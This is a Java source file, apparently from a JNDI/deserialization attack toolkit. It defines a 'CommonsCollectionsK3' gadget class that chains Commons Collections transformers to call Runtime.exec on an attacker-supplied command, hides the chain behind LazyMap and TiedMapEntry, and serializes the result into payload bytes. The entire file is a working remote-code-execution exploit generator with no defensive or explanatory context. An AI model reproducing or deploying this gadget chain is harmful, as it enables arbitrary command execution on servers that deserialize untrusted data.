package sonomon.jndi.deser.gadgets;

import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import sonomon.jndi.deser.Deserialize;
import sonomon.jndi.factory.FactoryUtils;

public class CommonsCollectionsK3 implements SerializeObject{
	public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
	    String[] execArgs = { payload };
	    Transformer[] transformers = { (Transformer)new ConstantTransformer(Runtime.class), (Transformer)new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }), (Transformer)new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), (Transformer)new InvokerTransformer("exec", new Class[] { String.class }, (Object[])execArgs), (Transformer)new ConstantTransformer(new HashSet()) };
	    ChainedTransformer inertChain = new ChainedTransformer(new Transformer[0]);
	    HashMap<String, String> innerMap = new HashMap<String, String>();
	    Map m = LazyMap.decorate(innerMap, (Transformer)inertChain);
	    Map<Object, Object> outerMap = new HashMap<Object, Object>();
	    TiedMapEntry tied = new TiedMapEntry(m, "v");
	    outerMap.put(tied, "t");
	    innerMap.clear();
	    Deserialize.setFieldValue(inertChain, "iTransformers", transformers);
        return outerMap;
    }
	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}
}